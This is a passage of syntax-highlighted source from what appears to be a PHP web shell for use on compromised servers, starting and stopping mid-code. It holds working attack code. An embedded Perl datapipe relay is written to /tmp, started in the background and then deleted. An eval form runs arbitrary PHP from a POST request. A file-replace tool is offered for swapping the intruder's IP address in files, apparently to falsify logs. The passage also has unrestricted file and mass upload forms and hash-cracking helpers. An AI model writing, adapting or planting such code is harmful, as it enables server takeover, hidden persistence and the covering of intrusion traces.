<span class="lineno">1641</span> <span class="s2">                        if (</span><span class="se">\$</span><span class="s2">result == 0) {</span>
<span class="lineno">1642</span> <span class="s2">                                print </span><span class="se">\&quot;</span><span class="s2">Child: Ïðîèçîøëî îòñîåäèíåíèå.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1643</span> <span class="s2">                                exit 0;</span>
<span class="lineno">1644</span> <span class="s2">                        }</span>
<span class="lineno">1645</span> 
<span class="lineno">1646</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Äàííûå: </span><span class="se">\$</span><span class="s2">cbuffer</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1647</span> <span class="s2">            }</span>
<span class="lineno">1648</span> 
<span class="lineno">1649</span> <span class="s2">                if (</span><span class="se">\$</span><span class="s2">fh  &amp;&amp;  </span><span class="se">\$</span><span class="s2">tbuffer) {</span>
<span class="lineno">1650</span> <span class="s2">                        (print </span><span class="se">\$</span><span class="s2">fh </span><span class="se">\$</span><span class="s2">tbuffer);</span>
<span class="lineno">1651</span> <span class="s2">                }</span>
<span class="lineno">1652</span> 
<span class="lineno">1653</span> <span class="s2">                while (my </span><span class="se">\$</span><span class="s2">len = length(</span><span class="se">\$</span><span class="s2">tbuffer)) {</span>
<span class="lineno">1654</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Îòïðàâëÿåì </span><span class="se">\$</span><span class="s2">len áàéò.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1655</span> <span class="s2">                        my </span><span class="se">\$</span><span class="s2">res = syswrite(</span><span class="se">\$</span><span class="s2">th, </span><span class="se">\$</span><span class="s2">tbuffer, </span><span class="se">\$</span><span class="s2">len);</span>
<span class="lineno">1656</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Äàííûå îòïðàâëåíû.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1657</span> <span class="s2">                        if (</span><span class="se">\$</span><span class="s2">res &gt; 0) {</span>
<span class="lineno">1658</span> <span class="s2">                                </span><span class="se">\$</span><span class="s2">tbuffer = substr(</span><span class="se">\$</span><span class="s2">tbuffer, </span><span class="se">\$</span><span class="s2">res);</span>
<span class="lineno">1659</span> <span class="s2">                        } else {</span>
<span class="lineno">1660</span> <span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child: Íåâîçìîæíî îòïðàâèòü äàííûå: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1661</span> <span class="s2">                        }</span>
<span class="lineno">1662</span> <span class="s2">                }</span>
<span class="lineno">1663</span> 
<span class="lineno">1664</span> <span class="s2">                while (my </span><span class="se">\$</span><span class="s2">len = length(</span><span class="se">\$</span><span class="s2">cbuffer)) {</span>
<span class="lineno">1665</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Îòïðàâëÿåì </span><span class="se">\$</span><span class="s2">len áàéò êëèåíòó.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1666</span> <span class="s2">                        my </span><span class="se">\$</span><span class="s2">res = syswrite(</span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">cbuffer, </span><span class="se">\$</span><span class="s2">len);</span>
<span class="lineno">1667</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Äàííûå îòïðàâëåíû..</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1668</span> <span class="s2">                        if (</span><span class="se">\$</span><span class="s2">res &gt; 0) {</span>
<span class="lineno">1669</span> <span class="s2">                                </span><span class="se">\$</span><span class="s2">cbuffer = substr(</span><span class="se">\$</span><span class="s2">cbuffer, </span><span class="se">\$</span><span class="s2">res);</span>
<span class="lineno">1670</span> <span class="s2">                        } else {</span>
<span class="lineno">1671</span> <span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child: Íåâîçìîæíî îòïðàâèòü äàííûå: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1672</span> <span class="s2">                        }</span>
<span class="lineno">1673</span> <span class="s2">                }</span>
<span class="lineno">1674</span> <span class="s2">        }</span>
<span class="lineno">1675</span> <span class="s2">}</span>
<span class="lineno">1676</span> 
<span class="lineno">1677</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1678</span> 
<span class="lineno">1679</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="lineno">1680</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_datapipe.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1681</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$datapipe_pl</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1682</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl /tmp/nst_perl_datapipe.pl &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1683</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_datapipe.pl&quot;</span><span class="p">);</span>
<span class="lineno">1684</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">1685</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="lineno">1686</span> <span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1687</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp/nst_perl_datapipe.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1688</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$datapipe_pl</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1689</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl .nst_datapipe_tmp/nst_perl_datapipe.pl &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1690</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp/nst_perl_datapipe.pl&quot;</span><span class="p">);</span>
<span class="lineno">1691</span> <span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1692</span> <span class="p">}</span>
<span class="lineno">1693</span> <span class="p">}</span>
<span class="lineno">1694</span> <span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="lineno">1695</span> 
<span class="lineno">1696</span> <span class="p">}</span><span class="c1">#end of datapipe perl</span>
<span class="lineno">1697</span> 
<span class="lineno">1698</span> 
<span class="lineno">1699</span> 
<span class="lineno">1700</span> 
<span class="lineno">1701</span> 
<span class="lineno">1702</span> <span class="k">if</span><span class="p">(</span><span class="nv">$show_ps</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span>
<span class="lineno">1703</span> <span class="k">print</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;1&lt;/b&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1704</span> <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1705</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;ps ux&quot;</span><span class="p">);</span>
<span class="lineno">1706</span> <span class="k">print</span> <span class="s2">&quot;&lt;/pre&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1707</span> <span class="p">}</span>
<span class="lineno">1708</span> 
<span class="lineno">1709</span> 
<span class="lineno">1710</span> 
<span class="lineno">1711</span> <span class="k">echo</span> <span class="s2">&quot;&lt;form method=post&gt;&lt;b&gt;md5:&lt;/b&gt;&lt;br&gt;&lt;input name=md5 size=30&gt;</span>
<span class="lineno">1712</span> <span class="s2">&lt;Br&gt;</span>
<span class="lineno">1713</span> <span class="s2">md5 online encoder/decoder (brutforce) (php) - [&lt;a href=http://nst.void.ru/?q=releases&amp;download=4&gt;DOWNLOAD&lt;/a&gt;]</span>
<span class="lineno">1714</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno">1715</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1716</span> <span class="o">@</span><span class="nv">$md5</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">];</span>
<span class="lineno">1717</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">]){</span> <span class="k">echo</span> <span class="s2">&quot;md5:&lt;br&gt;&lt;textarea rows=1 cols=113&gt;&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1718</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;</span>
<span class="lineno">1719</span> <span class="s2">&lt;form method=post&gt;&lt;b&gt;base64 e/d:&lt;/b&gt;&lt;br&gt;&lt;input name=base64 size=30&gt;&lt;/form&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1720</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">]){</span>
<span class="lineno">1721</span> <span class="o">@</span><span class="nv">$base64</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">];</span>
<span class="lineno">1722</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1723</span> <span class="s2">&lt;b&gt;Encode: &lt;br&gt;&lt;textarea rows=15 cols=113&gt;&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$base64</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;</span>
<span class="lineno">1724</span> <span class="s2">Decode:&lt;/b&gt; &lt;br&gt;&lt;textarea rows=15 cols=113&gt;&quot;</span><span class="o">.</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$base64</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1725</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;</span>
<span class="lineno">1726</span> <span class="s2">&lt;form method=post&gt;&lt;b&gt;DES:&lt;/b&gt;&lt;br&gt;&lt;input name=des size=30&gt;&lt;br&gt;</span>
<span class="lineno">1727</span> <span class="s2">John The Ripper [&lt;a href=http://www.openwall.com/john/ target=_blank&gt;Web&lt;/a&gt;]&lt;/form&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1728</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;des&#39;</span><span class="p">]){</span>
<span class="lineno">1729</span> <span class="o">@</span><span class="nv">$des</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;des&#39;</span><span class="p">];</span>
<span class="lineno">1730</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Des:&lt;/b&gt; &lt;br&gt;&lt;textarea rows=15 cols=113&gt;&quot;</span><span class="o">.</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$des</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1731</span> 
<span class="lineno">1732</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno">1733</span> <span class="s2">&lt;b&gt;eval:&lt;/b&lt;br&gt;</span>
<span class="lineno">1734</span> <span class="s2">(example: print </span><span class="se">\&quot;</span><span class="s2">Hello World</span><span class="se">\&quot;</span><span class="s2">;)</span>
<span class="lineno">1735</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno">1736</span> <span class="s2">&lt;font color=red&gt;&lt;b&gt;&lt;?&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">1737</span> <span class="s2">&lt;textarea name=eval rows=15 cols=113&gt;&lt;/textarea&gt;&lt;br&gt;</span>
<span class="lineno">1738</span> <span class="s2">&lt;b&gt;?&gt;&lt;/b&gt;&lt;/font&gt;&lt;br&gt;</span>
<span class="lineno">1739</span> <span class="s2">&lt;input type=submit value=Run style=&#39;width:150px;&#39;&gt;</span>
<span class="lineno">1740</span> <span class="s2">&lt;/form&gt;&lt;br&gt;</span>
<span class="lineno">1741</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1742</span> 
<span class="lineno">1743</span> <span class="k">function</span> <span class="nf">eval_sl</span><span class="p">(</span><span class="nv">$editf</span><span class="p">){</span>
<span class="lineno">1744</span> <span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">()</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
<span class="lineno">1745</span> <span class="nv">$editf</span><span class="o">=</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="lineno">1746</span> <span class="p">}</span>
<span class="lineno">1747</span> <span class="k">return</span> <span class="nv">$editf</span><span class="p">;</span>
<span class="lineno">1748</span> <span class="p">}</span>
<span class="lineno">1749</span> 
<span class="lineno">1750</span> 
<span class="lineno">1751</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]){</span>
<span class="lineno">1752</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;RESULT:&lt;br&gt;&lt;br&gt;&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1753</span> <span class="k">eval</span><span class="p">(</span><span class="nx">eval_sl</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]));</span>
<span class="lineno">1754</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1755</span> 
<span class="lineno">1756</span> <span class="k">print</span> <span class="s2">&quot;&lt;font color=green&gt;&lt;b&gt;PHP:&lt;/b&gt;&lt;br&gt;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1757</span> <span class="k">print</span> <span class="s2">&quot;&lt;?</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1758</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1759</span> <span class="k">print</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">eval_sl</span><span class="p">((</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">])));</span>
<span class="lineno">1760</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1761</span> <span class="k">print</span> <span class="s2">&quot;?&gt;</span><span class="se">\r\n\r\n</span><span class="s2">&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1762</span> 
<span class="lineno">1763</span> <span class="p">}</span>
<span class="lineno">1764</span> 
<span class="lineno">1765</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1766</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno">1767</span> 
<span class="lineno">1768</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;replace&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span>
<span class="lineno">1769</span> <span class="nv">$ip</span><span class="o">=@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
<span class="lineno">1770</span> <span class="nv">$d</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span>
<span class="lineno">1771</span> <span class="nv">$e</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="lineno">1772</span> <span class="o">@</span><span class="nv">$de</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">;</span>
<span class="lineno">1773</span> <span class="nv">$de</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$de</span><span class="p">);</span>
<span class="lineno">1774</span> <span class="nv">$e</span><span class="o">=@</span><span class="nv">$e</span><span class="p">;</span>
<span class="lineno">1775</span> <span class="k">echo</span> <span class="s2">&quot;[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&gt;Delete&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ef=</span><span class="si">$e</span><span class="s2">&amp;edit=1&#39;&gt;Edit&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;clean=1&#39;&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;replace=1&#39;&gt;Replace text in file&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;download=</span><span class="si">$e</span><span class="s2">&#39;&gt;Download&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;rename=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&gt;Rename&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;chmod=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&gt;CHMOD&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ccopy_to=</span><span class="si">$e</span><span class="s2">&#39;&gt;Copy&lt;/a&gt;]&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1776</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1777</span> <span class="s2">Replace tool:&lt;br&gt;</span>
<span class="lineno">1778</span> <span class="s2">(You can replace any text)&lt;br&gt;</span>
<span class="lineno">1779</span> <span class="s2">File: </span><span class="si">$de</span><span class="s2">&lt;br&gt;</span>
<span class="lineno">1780</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno">1781</span> <span class="s2">1. Your ip.&lt;br&gt;</span>
<span class="lineno">1782</span> <span class="s2">2. microsoft.com ip :)&lt;br&gt;</span>
<span class="lineno">1783</span> <span class="s2">Replace this &lt;input name=thisX size=30 value=</span><span class="si">$ip</span><span class="s2">&gt; by this &lt;input name=bythis size=30 value=207.46.245.156&gt;</span>
<span class="lineno">1784</span> <span class="s2">&lt;input type=submit name=doit value=Replace&gt;</span>
<span class="lineno">1785</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno">1786</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1787</span> 
<span class="lineno">1788</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;doit&#39;</span><span class="p">]){</span>
<span class="lineno">1789</span> <span class="o">@</span><span class="nv">$thisX</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;thisX&#39;</span><span class="p">];</span>
<span class="lineno">1790</span> <span class="o">@</span><span class="nv">$bythis</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;bythis&#39;</span><span class="p">];</span>
<span class="lineno">1791</span> <span class="o">@</span><span class="nv">$e</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="lineno">1792</span> <span class="nv">$filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1793</span> <span class="nv">$fd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno">1794</span> <span class="nv">$rpl</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fread</span> <span class="p">(</span><span class="nv">$fd</span><span class="p">,</span> <span class="o">@</span><span class="nb">filesize</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
<span class="lineno">1795</span> <span class="nv">$re</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$thisX</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$bythis</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$rpl</span><span class="p">);</span>
<span class="lineno">1796</span> <span class="nv">$x</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1797</span> <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$re</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1798</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;center&gt;</span><span class="si">$thisX</span><span class="s2"> Replaced by </span><span class="si">$bythis</span><span class="s2">&lt;br&gt;</span>
<span class="lineno">1799</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&#39;&gt;VIew file&lt;/a&gt;]&lt;br&gt;&lt;br&gt;&lt;Br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1800</span> 
<span class="lineno">1801</span> <span class="p">}</span>
<span class="lineno">1802</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1803</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno">1804</span> 
<span class="lineno">1805</span> 
<span class="lineno">1806</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;upload&quot;</span><span class="p">){</span>
<span class="lineno">1807</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;</span>
<span class="lineno">1808</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;t=massupload&#39;&gt;* Mass upload *&lt;/a&gt;&lt;br&gt;</span>
<span class="lineno">1809</span> <span class="s2">File upload:&lt;br&gt;</span>
<span class="lineno">1810</span> <span class="s2">&lt;form enctype=</span><span class="se">\&quot;</span><span class="s2">multipart/form-data</span><span class="se">\&quot;</span><span class="s2"> method=post&gt;</span>
<span class="lineno">1811</span> <span class="s2">&lt;input type=file name=text size=50&gt;&lt;br&gt;</span>
<span class="lineno">1812</span> <span class="s2">&lt;input name=where size=52 value=&#39;</span><span class="si">$d</span><span class="s2">&#39;&gt;&lt;br&gt;</span>
<span class="lineno">1813</span> <span class="s2">New file name:&lt;br&gt;</span>
<span class="lineno">1814</span> <span class="s2">&lt;input name=newf size=30 autocomplete=off&gt; (if empty, it will be default)&lt;br&gt;</span>
<span class="lineno">1815</span> <span class="s2">&lt;input type=submit value=Upload name=uploadf&gt;</span>
<span class="lineno">1816</span> <span class="s2">&lt;/form&gt;&lt;br&gt;</span>
<span class="lineno">1817</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1818</span> 
<span class="lineno">1819</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uploadf&#39;</span><span class="p">]){</span>
<span class="lineno">1820</span> <span class="nv">$where</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">];</span>
<span class="lineno">1821</span> <span class="nv">$newf</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;newf&#39;</span><span class="p">];</span>
<span class="lineno">1822</span> <span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="lineno">1823</span> <span class="k">if</span><span class="p">(</span><span class="nv">$newf</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$newf</span><span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];}</span><span class="k">else</span><span class="p">{</span><span class="nv">$newf</span><span class="o">=</span><span class="nv">$newf</span><span class="p">;}</span>
<span class="lineno">1824</span> <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.</span><span class="nv">$newf</span><span class="p">;</span>
<span class="lineno">1825</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1826</span> <span class="nv">$uploadfile</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$uploadfile</span><span class="p">);</span>
<span class="lineno">1827</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;&lt;br&gt;Uploaded to </span><span class="si">$uploadfile</span><span class="s2">&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1828</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">1829</span> <span class="k">echo</span> <span class="s2">&quot;&lt;i&gt;&lt;br&gt;Error&lt;/i&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1830</span> <span class="p">}</span>
<span class="lineno">1831</span> <span class="p">}</span>
<span class="lineno">1832</span> 
<span class="lineno">1833</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;massupload&quot;</span><span class="p">){</span>
<span class="lineno">1834</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1835</span> <span class="s2">Mass upload:&lt;br&gt;</span>
<span class="lineno">1836</span> <span class="s2">&lt;form enctype=</span><span class="se">\&quot;</span><span class="s2">multipart/form-data</span><span class="se">\&quot;</span><span class="s2"> method=post&gt;</span>
<span class="lineno">1837</span> <span class="s2">&lt;input type=file name=text1 size=43&gt; &lt;input type=file name=text11 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1838</span> <span class="s2">&lt;input type=file name=text2 size=43&gt; &lt;input type=file name=text12 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1839</span> <span class="s2">&lt;input type=file name=text3 size=43&gt; &lt;input type=file name=text13 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1840</span> <span class="s2">&lt;input type=file name=text4 size=43&gt; &lt;input type=file name=text14 size=43&gt;&lt;br&gt;</span>
<span class="lineno">1841</span> <span class="s2">&lt;input type=file name=text5 size=43&gt; &lt;input type=file name=text15 size=43&gt;&lt;br&gt;</span>
